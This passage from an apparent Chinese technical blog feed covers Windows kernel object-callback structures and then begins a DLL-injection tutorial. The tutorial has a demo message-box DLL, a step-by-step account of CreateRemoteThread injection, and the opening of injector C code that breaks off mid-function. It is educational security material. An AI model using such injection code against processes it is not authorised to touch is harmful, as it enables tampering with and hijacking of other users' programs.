class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID RegistrationContext,                             <span class="comment">// 驱动注册时提供的上下文指针，用于传递状态或策略配置</span></span></span><br><span class="line"><span class="params">    _In_ POB_POST_OPERATION_INFORMATION OperationInformation    <span class="comment">// 本次对象访问操作的结果信息结构体</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>OB_POST_OPERATION_INFORMATION</code> 与前面的 <code>OB_PRE_OPERATION_INFORMATION</code> 结构基本完全一致。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_POST_OPERATION_INFORMATION</span> &#123;</span></span><br><span class="line">    _In_ OB_OPERATION  Operation;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        _In_ ULONG Flags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            _In_ ULONG KernelHandle:<span class="number">1</span>;</span><br><span class="line">            _In_ ULONG Reserved:<span class="number">31</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    _In_ PVOID                          Object;</span><br><span class="line">    _In_ POBJECT_TYPE                   ObjectType;</span><br><span class="line">    _In_ PVOID                          CallContext;</span><br><span class="line">    _In_ NTSTATUS                       ReturnStatus;</span><br><span class="line">    _In_ POB_POST_OPERATION_PARAMETERS  Parameters;</span><br><span class="line">&#125; OB_POST_OPERATION_INFORMATION,*POB_POST_OPERATION_INFORMATION;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于后操作回调函数不修改权限，因此 <code>OB_POST_OPERATION_PARAMETERS</code> 中只有 <code>GrantedAccess</code>，并且对于 <code>DUPLICATE</code> 事件也不提供双方的进程对象地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_POST_CREATE_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">    _In_ ACCESS_MASK            GrantedAccess;</span><br><span class="line">&#125; OB_POST_CREATE_HANDLE_INFORMATION, *POB_POST_CREATE_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OB_POST_DUPLICATE_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">    _In_ ACCESS_MASK            GrantedAccess;</span><br><span class="line">&#125; OB_POST_DUPLICATE_HANDLE_INFORMATION, * POB_POST_DUPLICATE_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">OB_POST_OPERATION_PARAMETERS</span> &#123;</span></span><br><span class="line">    _In_ OB_POST_CREATE_HANDLE_INFORMATION       CreateHandleInformation;</span><br><span class="line">    _In_ OB_POST_DUPLICATE_HANDLE_INFORMATION    DuplicateHandleInformation;</span><br><span class="line">&#125; OB_POST_OPERATION_PARAMETERS, *POB_POST_OPERATION_PARAMETERS;</span><br></pre></td></tr></table></figure><h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="OBJECT-TYPE-1"><a href="#OBJECT-TYPE-1" class="headerlink" title="OBJECT_TYPE"></a>OBJECT_TYPE</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">6: kd&gt; dt nt!_OBJECT_TYPE</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY    // 链接所有 OBJECT_TYPE 实例</span><br><span class="line">   +0x010 Name             : _UNICODE_STRING</span><br><span class="line">   +0x020 DefaultObject    : Ptr64 Void  </span><br><span class="line">   +0x028 Index            : UChar        // 对象类型索引</span><br><span class="line">   +0x02c TotalNumberOfObjects : Uint4B   // 当前该类型对象的总数</span><br><span class="line">   +0x030 TotalNumberOfHandles : Uint4B   // 该类型所有对象的句柄总数</span><br><span class="line">   +0x034 HighWaterNumberOfObjects : Uint4B</span><br><span class="line">   +0x038 HighWaterNumberOfHandles : Uint4B</span><br><span class="line">   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER  // 类型初始化结构，定义该类型对象的行为（如回调、池分配方式等）</span><br><span class="line">   +0x0b8 TypeLock         : _EX_PUSH_LOCK </span><br><span class="line">   +0x0c0 Key              : Uint4B</span><br><span class="line">   +0x0c8 CallbackList     : _LIST_ENTRY  //📌对象回调链表，用于支持注册的 ObRegisterCallbacks 回调</span><br></pre></td></tr></table></figure><p>其中 <code>CallbackList</code> 是一个链表，存放我们注册的对象回调函数的存储结构 <code>OB_CALLBACK_ENTRY</code>。</p><h5 id="OBJECT-TYPE-INITIALIZER"><a href="#OBJECT-TYPE-INITIALIZER" class="headerlink" title="OBJECT_TYPE_INITIALIZER"></a>OBJECT_TYPE_INITIALIZER</h5><p><code>OBJECT_TYPE_INITIALIZER</code> 中还有一些列的回调函数，这些回调函数会针对不同内核对象的不同特性而指向不同的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x78 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;                                            <span class="comment">//0x0 结构体大小（用于版本兼容与校验）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT ObjectTypeFlags;                               <span class="comment">//0x2 对象类型标志位字段（压缩位）</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR CaseInsensitive:<span class="number">1</span>;                          <span class="comment">//0x2 是否大小写不敏感（如符号链接对象）</span></span><br><span class="line">            UCHAR UnnamedObjectsOnly:<span class="number">1</span>;                       <span class="comment">//0x2 是否只允许匿名对象（如事件、信号量等）</span></span><br><span class="line">            UCHAR UseDefaultObject:<span class="number">1</span>;                         <span class="comment">//0x2 是否使用 DefaultObject 提供默认实例</span></span><br><span class="line">            UCHAR SecurityRequired:<span class="number">1</span>;                         <span class="comment">//0x2 创建时是否必须提供安全描述符</span></span><br><span class="line">            UCHAR MaintainHandleCount:<span class="number">1</span>;                      <span class="comment">//0x2 是否维护句柄引用计数</span></span><br><span class="line">            UCHAR MaintainTypeList:<span class="number">1</span>;                         <span class="comment">//0x2 是否加入全局对象类型链表</span></span><br><span class="line">            UCHAR SupportsObjectCallbacks:<span class="number">1</span>;                  <span class="comment">//0x2 📌是否支持对象回调</span></span><br><span class="line">            UCHAR CacheAligned:<span class="number">1</span>;                             <span class="comment">//0x2</span></span><br><span class="line">            UCHAR UseExtendedParameters:<span class="number">1</span>;                    <span class="comment">//0x3</span></span><br><span class="line">            UCHAR Reserved:<span class="number">7</span>;                                 <span class="comment">//0x3</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG ObjectTypeCode;                                      <span class="comment">//0x4</span></span><br><span class="line">    ULONG InvalidAttributes;                                   <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">GENERIC_MAPPING</span> <span class="title">GenericMapping</span>;</span>                    <span class="comment">//0xc</span></span><br><span class="line">    ULONG ValidAccessMask;                                     <span class="comment">//0x1c 📌可用的访问权限位（ObCheckObjectAccess 用）</span></span><br><span class="line">    ULONG RetainAccess;                                        <span class="comment">//0x20 </span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> <span class="title">PoolType</span>;</span>                                  <span class="comment">//0x24 对象默认使用的内存池类型</span></span><br><span class="line">    ULONG DefaultPagedPoolCharge;                              <span class="comment">//0x28</span></span><br><span class="line">    ULONG DefaultNonPagedPoolCharge;                           <span class="comment">//0x2c</span></span><br><span class="line">    VOID (*DumpProcedure)(</span><br><span class="line">          VOID* arg1,</span><br><span class="line">          <span class="keyword">struct</span> _OBJECT_DUMP_CONTROL* arg2</span><br><span class="line">    );                                                        <span class="comment">//0x30 调试器 !object 调用的对象转储回调</span></span><br><span class="line">    LONG (*OpenProcedure)(</span><br><span class="line">          <span class="keyword">enum</span> _OB_OPEN_REASON arg1,</span><br><span class="line">          CHAR arg2, <span class="keyword">struct</span> _EPROCESS* arg3, </span><br><span class="line">          VOID* arg4, ULONG* arg5, ULONG arg6</span><br><span class="line">    );                                                        <span class="comment">//0x38 对象被打开（NtOpenXXX）时的访问控制回调</span></span><br><span class="line">    VOID (*CloseProcedure)(</span><br><span class="line">          <span class="keyword">struct</span> _EPROCESS* arg1,</span><br><span class="line">          VOID* arg2, ULONGLONG arg3, ULONGLONG arg4</span><br><span class="line">    );                                                        <span class="comment">//0x40 对象句柄关闭（NtClose）时调用的回调</span></span><br><span class="line">    VOID (*DeleteProcedure)(VOID* arg1);                      <span class="comment">//0x48 对象引用归零被删除时触发的清理回调</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LONG (*ParseProcedure)(</span><br><span class="line">              VOID* arg1, VOID* arg2,</span><br><span class="line">              <span class="keyword">struct</span> _ACCESS_STATE* arg3,</span><br><span class="line">              CHAR arg4, ULONG arg5, <span class="keyword">struct</span> _UNICODE_STRING* arg6, </span><br><span class="line">              <span class="keyword">struct</span> _UNICODE_STRING* arg7, VOID* arg8, </span><br><span class="line">              <span class="keyword">struct</span> _SECURITY_QUALITY_OF_SERVICE* arg9, VOID** arg10</span><br><span class="line">        );                                                     <span class="comment">//0x50 对象路径解析（如 NtOpenFile 解析路径）</span></span><br><span class="line">        LONG (*ParseProcedureEx)(</span><br><span class="line">              VOID* arg1, VOID* arg2, <span class="keyword">struct</span> _ACCESS_STATE* arg3, </span><br><span class="line">              CHAR arg4, ULONG arg5, <span class="keyword">struct</span> _UNICODE_STRING* arg6, </span><br><span class="line">              <span class="keyword">struct</span> _UNICODE_STRING* arg7, VOID* arg8,</span><br><span class="line">              <span class="keyword">struct</span> _SECURITY_QUALITY_OF_SERVICE* arg9,</span><br><span class="line">              <span class="keyword">struct</span> _OB_EXTENDED_PARSE_PARAMETERS* arg10, VOID** arg11</span><br><span class="line">        );                                                     <span class="comment">//0x50</span></span><br><span class="line">    &#125;;</span><br><span class="line">    LONG (*SecurityProcedure)(</span><br><span class="line">          VOID* arg1, <span class="keyword">enum</span> _SECURITY_OPERATION_CODE arg2,</span><br><span class="line">          ULONG* arg3, VOID* arg4, ULONG* arg5, VOID** arg6, </span><br><span class="line">          <span class="keyword">enum</span> _POOL_TYPE arg7, <span class="keyword">struct</span> _GENERIC_MAPPING* arg8, CHAR arg9</span><br><span class="line">    );                                                        <span class="comment">//0x58 安全描述符读取/修改操作回调</span></span><br><span class="line">    LONG (*QueryNameProcedure)(</span><br><span class="line">          VOID* arg1, UCHAR arg2, </span><br><span class="line">          <span class="keyword">struct</span> _OBJECT_NAME_INFORMATION* arg3, </span><br><span class="line">          ULONG arg4, ULONG* arg5, CHAR arg6</span><br><span class="line">    );                                                        <span class="comment">//0x60 查询对象名称信息的回调（如 NtQueryObject）</span></span><br><span class="line">    UCHAR (*OkayToCloseProcedure)(</span><br><span class="line">           <span class="keyword">struct</span> _EPROCESS* arg1, VOID* arg2,</span><br><span class="line">           VOID* arg3, CHAR arg4</span><br><span class="line">    );                                                        <span class="comment">//0x68 判断是否允许关闭对象句柄（可用于保护特定句柄）</span></span><br><span class="line">    ULONG WaitObjectFlagMask;                                 <span class="comment">//0x70</span></span><br><span class="line">    USHORT WaitObjectFlagOffset;                              <span class="comment">//0x74</span></span><br><span class="line">    USHORT WaitObjectPointerOffset;                           <span class="comment">//0x76</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h5 id="OB-CALLBACK-HANDLE"><a href="#OB-CALLBACK-HANDLE" class="headerlink" title="OB_CALLBACK_HANDLE"></a>OB_CALLBACK_HANDLE</h5><p>调用 <code>ObRegisterCallbacks</code> 注册回调函数成功后会返回一个 <code>RegistrationHandle</code> 句柄，其指向指向 <code>OB_CALLBACK_HANDLE</code> 未公开结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _OB_CALLBACK_HANDLE &#123;</span><br><span class="line">    USHORT Version;                          // 0x00:注册结构版本号，必须为 OB_FLT_REGISTRATION_VERSION</span><br><span class="line">    USHORT OperationRegistrationCount;       // 0x02:实际成功注册的回调项数量（CallbackEntryArray中的项数）</span><br><span class="line">    UINT32 Padding;</span><br><span class="line">    PVOID RegistrationContext;               // 0x08:调用者定义的上下文，可在回调中访问</span><br><span class="line">    UNICODE_STRING Altitude;                 // 0x10:注册高度（Altitude）</span><br><span class="line">                                             // (16 bytes: Len, MaxLen, BufferPtr指向本内存块的最末尾)</span><br><span class="line">    OB_CALLBACK_ENTRY CallbackEntryArray[1]; // 0x20:变长数组，用于存储所有回调项（按需分配内存）</span><br><span class="line">&#125; OB_CALLBACK_HANDLE, *POB_CALLBACK_HANDLE;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _OB_CALLBACK_ENTRY &#123;</span><br><span class="line">    LIST_ENTRY CallbackList;               // 0x00:链表节点，挂入 ObjectType-&gt;CallbackList 链表</span><br><span class="line">    ULONG Operations;                      // 0x10:触发操作标志：如 OB_OPERATION_HANDLE_CREATE / DUPLICATE</span><br><span class="line">    ULONG Flags;                           // 0x14:状态标志：如 OB_CALLBACK_ACTIVE_FLAG</span><br><span class="line">    POB_CALLBACK_HANDLE CallbackHandle;   // 0x18:所属回调句柄（OB_CALLBACK_HANDLE），用于回溯清理</span><br><span class="line">    POBJECT_TYPE ObjectType;              // 0x20:注册目标对象类型（如 PsProcessType、PsThreadType）</span><br><span class="line">    POB_PRE_OPERATION_CALLBACK PreOperation;   // 0x28:创建或复制前的预回调函数指针</span><br><span class="line">    POB_POST_OPERATION_CALLBACK PostOperation; // 0x30:创建或复制后的后回调函数指针</span><br><span class="line">    EX_RUNDOWN_REF RundownRef;            // 0x38:Rundown 保护，用于延迟释放 CallbackEntry</span><br><span class="line">&#125; OB_CALLBACK_ENTRY, *POB_CALLBACK_ENTRY;</span><br></pre></td></tr></table></figure><h4 id="注册过程-3"><a href="#注册过程-3" class="headerlink" title="注册过程"></a>注册过程</h4><p>当用户调用 <code>ObRegisterCallbacks</code> 时：</p><ol><li>检查 <code>CallbackRegistration-&gt;Version</code> 是否为 <code>0x100</code></li><li>内核调用 <code>ExAllocatePoolWithTag</code>分配一块分配一块 PagedPool 内存，Tag 为 <code>&#39;ObCb&#39;</code>，包含 <code>OB_CALLBACK_HANDLE</code>和若干 <code>OB_CALLBACK_ENTRY</code>结构，会把用户的 <code>Altitude</code> 字符串拷贝到这块内存的尾部。</li><li>检查 <code>ObjectType</code> 是否支持回调（Flags &amp; 0x40），使用 <code>MmVerifyCallbackFunctionCheckFlags</code> 检查签名。</li><li>它为每个注册的操作（Process Create&#x2F;Duplicate 等）初始化一个 <code>OB_CALLBACK_ENTRY</code>。</li><li>它持有对象类型锁，遍历现有的回调链表。</li><li>它根据 <code>Altitude</code> 字符串的大小，将你的回调节点插入到 <code>ObjectType-&gt;CallbackList</code> 的特定位置。</li><li>CallbackList 是降序排列的，头部是 Altitude 最大的节点，尾部是 Altitude 最小的节点。</li><li>PreOperation是Altitude大的先执行，PostOperation与之相反</li></ol>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows dll注入与R3 hook</title>
      <link href="/2025/12/12/2025-12-12-windows_dll_injection/"/>
      <url>/2025/12/12/2025-12-12-windows_dll_injection/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Windows-DLL-注入和Api-Hook"><a href="#Windows-DLL-注入和Api-Hook" class="headerlink" title="Windows DLL 注入和Api Hook"></a>Windows DLL 注入和Api Hook</h1><h2 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h2><p>DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。</p><p><strong>核心原理：</strong><br>Windows 操作系统对进程实施了<strong>虚拟内存隔离</strong>机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在目标进程的内存中写入恶意 DLL 的路径，并操纵目标进程的主动加载行为（通常是强制调用 <code>LoadLibrary</code> API），从而使恶意 DLL 成为目标进程的一部分。</p><p>一旦注入成功，DLL 将拥有与目标进程相同的权限（Process Token），能够访问其内存数据、挂钩 API 或作为跳板进行持久化攻击。</p><p><code>MessageBoxDll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_SUCESS 0</span></span><br><span class="line">__declspec(dllexport) <span class="type">int</span> __cdecl <span class="title function_">DownLoadFileFromUrl</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Start Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Stop Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (fdwReason)</span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">// 将dll文件附加到进程（加载到地址空间时）。</span></span><br><span class="line">      <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">          DownLoadFileFromUrl(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 在进程中创建了新线程之后会执行。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 进程中的线程退出时，执行的函数。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 当dll从进程空间脱离（退出）时执行的进程。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        DownLoadFileFromUrl(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="经典远程线程注入-Classic-CreateRemoteThread"><a href="#经典远程线程注入-Classic-CreateRemoteThread" class="headerlink" title="经典远程线程注入 (Classic CreateRemoteThread)"></a>经典远程线程注入 (Classic CreateRemoteThread)</h3><p>这是最基础也是最通用的注入方式，旨在向普通用户进程注入 DLL。</p><h4 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h4><p>攻击者进程在目标进程中开辟内存，写入 DLL 路径，然后“远程”命令目标进程创建一个新线程。这个新线程的唯一任务就是执行 <code>LoadLibrary</code> 函数，从而加载指定的 DLL。</p><h4 id="实现方法与流程-参考-classicdllinjection-c"><a href="#实现方法与流程-参考-classicdllinjection-c" class="headerlink" title="实现方法与流程 (参考 classicdllinjection.c)"></a>实现方法与流程 (参考 <code>classicdllinjection.c</code>)</h4><ol><li><strong>获取权限</strong> ：获取目标进程句柄。</li><li><strong>分配内存</strong> ：在目标进程空间中申请一块内存。</li><li><strong>写入数据</strong> ：将 DLL 的完整路径写入刚才申请的内存。</li><li><strong>地址解析</strong> ：计算 <code>LoadLibraryW</code> 函数在内存中的地址（通常利用 Kernel32.dll 在所有进程中基址相同的特性，或使用 PEB Walking 技术）。</li><li><strong>执行注入</strong> ：创建远程线程调用 <code>LoadLibraryW</code>。</li></ol><h4 id="1-3-核心-API-及作用"><a href="#1-3-核心-API-及作用" class="headerlink" title="1.3 核心 API 及作用"></a>1.3 核心 API 及作用</h4><ul><li><code>OpenProcess(PROCESS_ALL_ACCESS, ...)</code>：获取目标进程的操作句柄，需要足够的权限（如 <code>VM_WRITE</code>, <code>VM_OPERATION</code>）。</li><li><code>VirtualAllocEx(...)</code>： <strong>关键步骤</strong> 。在<strong>目标进程</strong>的内存空间中分配内存，用于存放 DLL 路径字符串。</li><li><code>WriteProcessMemory(...)</code>：将本地的 DLL 路径字符串复制到目标进程刚才分配的内存中。</li><li><code>GetRemoteModuleHandle</code> &#x2F; <code>GetProcAddress</code>：获取 <code>LoadLibrary</code> 函数的地址。在你的代码中，使用了更高级的 PEB Walking 技术来查找模块基址。</li><li><code>CreateRemoteThread(...)</code>： <strong>核心触发点</strong> 。在目标进程中创建一个新线程，线程的入口点设为 <code>LoadLibrary</code>，参数设为 DLL 路径的内存地址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 1. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span 